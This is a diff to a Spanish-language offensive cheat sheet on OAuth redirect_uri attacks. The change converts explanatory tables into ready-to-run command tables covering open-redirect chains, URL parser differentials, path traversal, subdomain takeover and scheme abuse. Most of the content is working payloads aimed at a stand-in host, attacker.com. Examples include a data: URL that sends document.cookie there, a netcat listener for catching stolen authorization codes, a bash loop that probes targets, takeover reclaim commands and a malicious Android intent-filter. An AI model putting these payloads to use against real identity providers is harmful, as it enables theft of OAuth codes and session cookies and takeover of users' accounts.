@@ -24,26 +24,21 @@ linked:
 
 ## Open Redirect Encadenado
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | App tiene open redirect interno dentro del dominio whitelisted. IdP confía dominio → emite code → open redirect leakea code a atacante. | Trust transfer. |
-| Endpoint OR genérico | `redirect_uri=https://known.com/redirect?url=https://attacker.com` | Common. |
-| Login next param | `redirect_uri=https://known.com/login?next=https://attacker.com` | Post-login redirect. |
-| Logout return param | `redirect_uri=https://known.com/logout?return=https://attacker.com` | Post-logout. |
-| 404 con back link | `redirect_uri=https://known.com/404?back=https://attacker.com` | Error pages. |
-| App propio re-redirect | App callback que re-redirige a `?return_to=` | Multi-hop. |
-| Ad/affiliate redirect | `https://known.com/ads/click?to=attacker.com` | Common in marketing. |
-| Marketing tracking | `/track?dest=` | Vendor tools. |
-| CDN/proxy redirect | `/proxy?url=` | Internal infra. |
-| Code arriba via Referer | Browser sends `Referer: known.com/cb?code=XYZ` to attacker | Leak vector. |
-| Code arriba via param | Open redirect preserva query → `?code=XYZ` arriba | Direct theft. |
-| Combine SSRF allowlist | Server-side allowlist follows redirects → SSRF chain | SSRF combo. |
+| `https://idp/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/redirect?url=https://attacker.com&state=X&scope=email` | Code leak via OR interno de known.com | known.com tiene OR + es whitelisted. |
+| `redirect_uri=https://known.com/login?next=https://attacker.com` | Leak via post-login next param | known.com con next/return param. |
+| `redirect_uri=https://known.com/logout?return=https://attacker.com` | Leak post-logout | Logout flow con return. |
+| `redirect_uri=https://known.com/404?back=https://attacker.com` | Error page back link OR | 404/error pages con back link. |
+| `redirect_uri=https://known.com/track?dest=https://attacker.com` | Marketing redirect | Affiliate/ad tracking endpoints. |
+| `redirect_uri=https://known.com/proxy?url=https://attacker.com` | CDN/proxy URL handler | Internal infra. |
+| Capturar Referer en `attacker.com` post-redirect | `Referer: known.com/cb?code=XYZ` | OR sin preservar query → code en Referer. |
+| `nc -lvnp 80` en attacker.com → recibir GET con `code` query | Code directo en URL | OR preserva query string. |
 ^oauth-redirect-openredirect
 
 ### Workflow Open Redirect chain
 
 ```http
-# Atacante envía link a víctima
 GET /oauth/authorize?
   client_id=APP&
   response_type=code&
@@ -51,12 +46,11 @@ GET /oauth/authorize?
   state=ABC&
   scope=email
 
-# IdP valida → known.com es whitelisted → emite code
+# IdP valida → known.com whitelisted → emite code
 HTTP/1.1 302 Found
 Location: https://known.com/redirect?url=https://attacker.com/steal&code=XYZ&state=ABC
 
-# known.com redirige a attacker.com → atacante recibe code en Referer
-# o si OR preserva query → code en URL directo
+# known.com redirige a attacker.com → atacante recibe code en Referer o query
 GET /steal?code=XYZ&state=ABC HTTP/1.1
 Host: attacker.com
 ```
@@ -65,47 +59,37 @@ ___
 
 ## Path Traversal y Suffix Abuse
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Validation laxa (prefix/substring/hostname-only). Manipular path/host para escapar al dominio atacante. | Bypass weak validation. |
-| `startswith` prefix match | `redirect_uri=https://known.com/cb/../../attacker` | Path traversal interno. |
-| Domain match sin path | `redirect_uri=https://known.com/file_upload_xss` | Si known.com tiene file upload. |
-| Suffix domain abuse | `redirect_uri=https://known.com.attacker.com/cb` | DNS atacante con prefix. |
-| Substring match | `redirect_uri=https://attacker.com/?x=https://known.com/cb` | Server contains check. |
-| Trailing slash mismatch | `cb/` vs `cb` registered | Normalize bug. |
-| Case insensitive abuse | `https://KNOWN.com/cb` aceptado | Lower-case normalize. |
-| Unicode IDN homograph | `https://kńown.com/cb` (punycode) | Visual confusion. |
-| Hyphen domain trick | `https://known-com.attacker.com/cb` | Sub abuse. |
-| Underscore subdomain | `https://known_com.attacker.com/cb` | Some parsers. |
-| Port confusion | `https://known.com:80@attacker.com/cb` | Userinfo trick. |
-| Multiple subdomains | `https://attacker.com.evil.known.com/cb` | Wildcard creative. |
-| Encoded slashes | `redirect_uri=https://known.com%2F..%2Fattacker.com/cb` | URL encoding. |
-| Double encoding | `%252F..%252F` | Decode chain. |
-| Null byte | `https://known.com%00.attacker.com/cb` | Some parsers truncate. |
+| `redirect_uri=https://known.com/cb/../../attacker.com` | Path traversal escape | Validation startswith / prefix match. |
+| `redirect_uri=https://known.com.attacker.com/cb` | Suffix dominio atacante | Validation domain endswith laxa. |
+| `redirect_uri=https://attacker.com/?x=https://known.com/cb` | Substring match bypass | Server contiene check substring. |
+| `redirect_uri=https://known.com/cb/` y `redirect_uri=https://known.com/cb` | Trailing slash mismatch | Normalize bug. |
+| `redirect_uri=https://KNOWN.com/cb` | Case sensitivity bypass | Validation case-sensitive. |
+| `redirect_uri=https://kńown.com/cb` (IDN homograph, encoded como xn--knwn-...) | Visual confusion | Unicode IDN parsing. |
+| `redirect_uri=https://known-com.attacker.com/cb` | Hyphen domain trick | Wildcard creative. |
+| `redirect_uri=https://known.com:80@attacker.com/cb` | Userinfo trick — host real es attacker | URL parser permissivo. |
+| `redirect_uri=https://known.com%2F..%2Fattacker.com/cb` | Encoded slashes path traversal | Decode-after-validate. |
+| `redirect_uri=https://known.com%252F..%252Fattacker.com/cb` | Double encoding | Multi-pass decode. |
+| `redirect_uri=https://known.com%00.attacker.com/cb` | Null byte truncation | Parser-truncate variant. |
 ^oauth-redirect-pathtraversal
 
 ___
 
 ## URL Parser Differential
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Server valida URL con parser A, browser sigue con parser B. Diferencia → host distinto. | Orange Tsai 2017. |
-| Userinfo `@` confusion | `https://known.com@attacker.com/cb` | userinfo=known.com, host=attacker.com. |
-| Fragment `#@` | `https://attacker.com#@known.com/cb` | Some parsers see known.com host. |
-| Backslash | `https://known.com\.attacker.com/cb` | Inconsistent across libs. |
-| Tab char | `https://known.com%09.attacker.com/cb` | Control char abuse. |
-| CRLF | `https://known.com%0d%0a.attacker.com/cb` | Header injection edge. |
-| `?@` query | `https://known.com?@attacker.com/cb` | Parser dispute. |
-| IPv6 brackets | `https://[::known.com]/cb` | Some fail. |
-| Triple slash | `https:///attacker.com/cb` | host="". |
-| Slash backslash mix | `https:/\/attacker.com/cb` | Edge. |
-| Port in userinfo | `https://known.com:443@attacker.com/cb` | userinfo with port. |
-| Empty userinfo | `https://@attacker.com/cb` | Edge. |
-| Multiple `@` | `https://known.com@a@attacker.com/cb` | Parser ambiguity. |
-| Schemeless `//` | `//attacker.com/cb` | Protocol-relative. |
-| `https//known.com.attacker.com` (missing colon) | Broken scheme | Some normalize. |
-| Whitespace in host | `https:// known.com/cb` | Some accept. |
+| `redirect_uri=https://known.com@attacker.com/cb` | userinfo=known.com, host=attacker.com (host hijack) | Server parser ≠ browser parser. |
+| `redirect_uri=https://attacker.com#@known.com/cb` | Server ve known.com como host, browser ve attacker.com | Fragment-based parser confusion. |
+| `redirect_uri=https://known.com\.attacker.com/cb` | Backslash inconsistency parsers | Algunos validators ignoran `\`. |
+| `redirect_uri=https://known.com%09.attacker.com/cb` | Tab char abuse | Control char en hostname. |
+| `redirect_uri=https://known.com?@attacker.com/cb` | Query separator confusion | Parser dispute. |
+| `redirect_uri=https:///attacker.com/cb` | Triple slash → empty host | Host="" edge. |
+| `redirect_uri=https:/\/attacker.com/cb` | Slash/backslash mix | Algunos parsers normalizan. |
+| `redirect_uri=//attacker.com/cb` | Protocol-relative URL | Schemeless. |
+| `redirect_uri=https:// known.com/cb` (con espacio) | Whitespace en host | Parser tolerante. |
+| Bash loop probando todos los tricks → ver code block | Bulk parser test | Identificar variant que funciona. |
 ^oauth-redirect-parser
 
 ### Parser test loop
@@ -121,8 +105,8 @@ for trick in \
   'https:/\/attacker.com/cb' \
   'https://known.com%09.attacker.com/cb'; do
   ENC=$(printf '%s' "$trick" | jq -sRr @uri)
-  curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=$ENC&state=X" \
-    | grep -i location
+  echo "=== $trick ==="
+  curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=$ENC&state=X" | grep -iE 'location|^HTTP'
 done
 ```
 
@@ -130,84 +114,74 @@ ___
 
 ## Subdomain Confusion / Takeover
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Whitelist `*.known.com`. Atacante busca subdomain takeable o registra subdomain self-service. | Trust transfer. |
-| CNAME dangling Heroku | `*.known.com` apuntando a Heroku app no claimed | `heroku apps:create attacker-victim`. |
-| CNAME dangling S3 | Apunta a S3 bucket disponible | `aws s3 mb s3://victim-bucket`. |
-| CNAME dangling GitHub Pages | Apunta a `username.github.io` no usado | Crear repo + CNAME. |
-| CNAME Azure/Cloudflare | Multiple service providers vulnerables | Service-specific reclaim. |
-| Self-service subdomain | Apps tipo Squarespace, Tumblr, Shopify dan `username.platform.com` | Si platform es target. |
-| Dev/staging débil | `dev.known.com` con XSS o auth bypass | Inyectar payload. |
-| Customer subdomain SaaS | `tenant.known.com` multitenancy | Atacante customer registra. |
-| Wildcard cert leak | Cert privado expuesto | MITM cualquier subdomain. |
-| DNS rebinding | DNS responde primero IP known luego IP attacker | TOCTOU. |
-| Internal docs subdomain | `docs.known.com`, `staging.known.com` con weak auth | Lateral. |
-| Forgotten DNS records | `old.known.com` con dangling A record IP libre | IP reclaim. |
-| Recon CNAMEs | `subjack`, `nuclei -t takeovers/`, `dnsx` | Discovery. |
-| Heroku `No such app` page | Sign of takeable | Detection. |
-| GitHub Pages 404 | Missing repo signal | Detection. |
-| `nosuchbucket` S3 | S3 takeover signal | Detection. |
+| `subfinder -d known.com -silent \| httpx -silent -title -web-server -mc 200,403,404` | Lista subdomains alive de known.com | Pre-takeover recon. |
+| `subjack -w subs.txt -t 100 -timeout 30 -ssl -c subjack-fingerprints.json -v 3` | Auto-detect dangling subdomains | Takeover candidates. |
+| `nuclei -t http/takeovers/ -l subs.txt` | Templates específicos de takeover por servicio | Per-platform detection. |
+| `dig CNAME abandoned.known.com` | CNAME del subdomain dangling | Identificar service. |
+| `heroku apps:create attacker-victim` | Reclamar Heroku app abandonada | CNAME apunta a Heroku. |
+| `aws s3 mb s3://victim-bucket` | Reclamar S3 bucket | CNAME apunta a S3. |
+| Crear repo `username.github.io` con CNAME file = `victim.known.com` | GitHub Pages takeover | CNAME apunta a github.io. |
+| Post-takeover: `redirect_uri=https://reclaimed.known.com/cb` | OAuth code interceptado | Wildcard `*.known.com` whitelisted. |
+| `host -t A old.known.com` y verificar IP libre | DNS dangling A record | IP reclaim posible. |
 ^oauth-redirect-subdomain
 
-### Subdomain takeover scan
+### Subdomain takeover scan workflow
 
 ```bash
 # Recon
 subfinder -d known.com -silent | \
-  httpx -silent -title -web-server -mc 200,403,404 | \
-  grep -iE '(no such app|nosuchbucket|github\.io|domain not configured)'
+  httpx -silent -title -web-server -mc 200,403,404 -o alive.txt
 
-# Verify with nuclei
-echo "https://abandoned.known.com" | nuclei -t http/takeovers/
+# Filter takeover signals
+grep -iE '(no such app|nosuchbucket|github\.io|domain not configured|fastly error)' alive.txt
 
-# Reclaim por provider
-# Heroku:        heroku apps:create attacker-victim
-# GitHub Pages:  crear repo + CNAME file
-# AWS S3:        aws s3 mb s3://victim-bucket
-# Azure:         New-AzWebApp -Name "attacker-victim"
+# Validar con nuclei
+nuclei -t http/takeovers/ -l alive.txt -o takeovers.txt
+
+# Reclaim según provider:
+# Heroku:    heroku apps:create attacker-victim
+# S3:        aws s3 mb s3://victim-bucket
+# GH Pages:  crear repo + CNAME file
+# Azure:     New-AzWebApp -Name "attacker-victim"
 ```
 
 ___
 
 ## Scheme Abuse y Native App Hijack
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | App acepta esquemas no-HTTPS o flexibles. Atacante usa scheme alternativo para XSS o app hijack. | Scheme switch. |
-| `javascript:` direct | `redirect_uri=javascript:alert(document.cookie)` | XSS si reflectado. |
-| `data:` HTML | `redirect_uri=data:text/html,<script>fetch('//evil')</script>` | Data URL XSS. |
-| `data:` base64 | `data:text/html;base64,PHNjcmlwdD4uLi4=` | Encoded. |
-| Custom scheme hijack Android | App atacante registra mismo `intent-filter` que app legit | Intent picker. |
-| Custom scheme exact match Android | `myapp://callback` aceptado por dos apps | User picks malicioso. |
-| iOS Universal Links bypass | Browser handles URL antes de app | Code en browser. |
-| Loopback `127.0.0.1:PORT` | Public clients allowed | Confused deputy local. |
-| `file://` scheme | `redirect_uri=file:///etc/passwd` | Some parsers accept. |
-| FTP/Gopher legacy | Old parsers permite | SSRF combo. |
-| Cross-app intent Android | `intent://...#Intent;...` | Bypass intent-filter strict. |
-| WebView default scheme | Mobile webview escapes | Per-platform edge. |
-| `chrome:` / `about:` | Browser-internal schemes | Edge. |
-| `mailto:` / `sms:` | OS handler hijack | Phishing chain. |
-| Empty scheme | `://attacker.com/cb` | Some parsers accept. |
+| `redirect_uri=javascript:alert(document.cookie)` | XSS direct via JS scheme | IdP no valida scheme http/https. |
+| `redirect_uri=data:text/html,<script>fetch('//attacker?'+document.cookie)</script>` | XSS via data URL | data: scheme aceptado. |
+| `redirect_uri=data:text/html;base64,PHNjcmlwdD4uLi48L3NjcmlwdD4=` | Data URL base64 encoded | Filter naive sobre `<script>`. |
+| `redirect_uri=file:///etc/passwd` | LFI via file scheme | Parser permissivo. |
+| `redirect_uri=intent://callback#Intent;scheme=myapp;package=com.attacker;end` | Android intent hijack | App atacante con intent-filter. |
+| `redirect_uri=myapp://callback` (registrar app atacante con mismo scheme) | Custom scheme hijack mobile | Intent picker mostraría ambas apps. |
+| `redirect_uri=://attacker.com/cb` (empty scheme) | Empty scheme parser bypass | Parser tolerante. |
+| `redirect_uri=http://127.0.0.1:8080/cb` (localhost loopback) | Confused deputy si app no enforce | Public clients allowed loopback. |
 ^oauth-redirect-scheme
 
-### Scheme test
+### Scheme test commands
 
 ```bash
-# JS scheme
-curl -sI "https://target/oauth/authorize?...&redirect_uri=javascript:alert(1)"
+# JS scheme XSS probe
+curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&state=X&redirect_uri=javascript:alert(1)" | grep -i location
 
-# Data scheme
+# Data URL XSS payload
 RU=$(printf 'data:text/html,<script>fetch(location.search).then(r=>fetch("https://attacker.com?"+r))</script>' | jq -sRr @uri)
-curl -sI "https://target/oauth/authorize?...&redirect_uri=$RU"
+curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&state=X&redirect_uri=$RU" | grep -i location
 
-# Android intent hijack PoC en app atacante's manifest:
-# <intent-filter>
-#   <action android:name="android.intent.action.VIEW"/>
-#   <category android:name="android.intent.category.DEFAULT"/>
-#   <category android:name="android.intent.category.BROWSABLE"/>
-#   <data android:scheme="myapp" android:host="callback"/>
-# </intent-filter>
+# Android intent-filter en app maliciosa AndroidManifest.xml:
+cat <<EOF
+<intent-filter>
+  <action android:name="android.intent.action.VIEW"/>
+  <category android:name="android.intent.category.DEFAULT"/>
+  <category android:name="android.intent.category.BROWSABLE"/>
+  <data android:scheme="myapp" android:host="callback"/>
+</intent-filter>
+EOF
 ```
 
 ***
